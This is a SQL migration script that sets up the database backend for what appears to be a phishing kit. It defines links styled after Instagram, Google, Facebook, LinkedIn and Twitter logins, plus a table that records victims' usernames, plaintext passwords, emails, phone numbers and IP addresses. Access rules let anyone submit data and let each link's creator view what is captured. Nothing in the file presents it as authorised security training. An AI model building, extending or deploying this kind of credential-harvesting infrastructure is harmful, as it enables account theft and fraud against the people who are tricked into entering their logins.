-- Phishing links and submissions tables
-- Run via Supabase SQL editor or the migrate helper script.

create table if not exists public.phishing_links (
  id uuid primary key default uuid_generate_v4(),
  slug text not null unique,
  name text not null,
  template_type text not null check (template_type in ('instagram', 'google', 'facebook', 'linkedin', 'twitter', 'generic')),
  created_by uuid not null references public.users(id) on delete cascade,
  created_at timestamptz not null default now(),
  updated_at timestamptz not null default now(),
  visits integer not null default 0,
  submissions_count integer not null default 0
);

create table if not exists public.phishing_submissions (
  id uuid primary key default uuid_generate_v4(),
  phishing_link_id uuid not null references public.phishing_links(id) on delete cascade,
  username text,
  password text,
  email text,
  phone text,
  ip_address text,
  user_agent text,
  created_at timestamptz not null default now()
);

-- Indexes
create index if not exists idx_phishing_links_slug on public.phishing_links(slug);
create index if not exists idx_phishing_links_created_by on public.phishing_links(created_by);
create index if not exists idx_phishing_submissions_link_id on public.phishing_submissions(phishing_link_id);
create index if not exists idx_phishing_submissions_created_at on public.phishing_submissions(created_at desc);

-- Enable RLS
alter table public.phishing_links enable row level security;
alter table public.phishing_submissions enable row level security;

-- RLS Policies for phishing_links
create policy if not exists "Users can create phishing links" on public.phishing_links
  for insert with check (auth.uid() = created_by);

create policy if not exists "Users can view own phishing links" on public.phishing_links
  for select using (created_by = auth.uid() or public.is_admin());

create policy if not exists "Users can update own phishing links" on public.phishing_links
  for update using (created_by = auth.uid())
  with check (created_by = auth.uid());

create policy if not exists "Users can delete own phishing links" on public.phishing_links
  for delete using (created_by = auth.uid() or public.is_admin());

-- RLS Policies for phishing_submissions
create policy if not exists "Anyone can insert submissions" on public.phishing_submissions
  for insert with check (true);

create policy if not exists "Users can view submissions for own links" on public.phishing_submissions
  for select using (
    exists (
      select 1 from public.phishing_links
      where phishing_links.id = phishing_submissions.phishing_link_id
      and (phishing_links.created_by = auth.uid() or public.is_admin())
    )
  );

-- Function to update submissions count
create or replace function update_phishing_link_submissions_count()
returns trigger as $$
begin
  update public.phishing_links
  set submissions_count = (
    select count(*) from public.phishing_submissions
    where phishing_link_id = new.phishing_link_id
  )
  where id = new.phishing_link_id;
  return new;
end;
$$ language plpgsql;

-- Trigger to update submissions count
create trigger if not exists trigger_update_submissions_count
after insert on public.phishing_submissions
for each row execute function update_phishing_link_submissions_count();


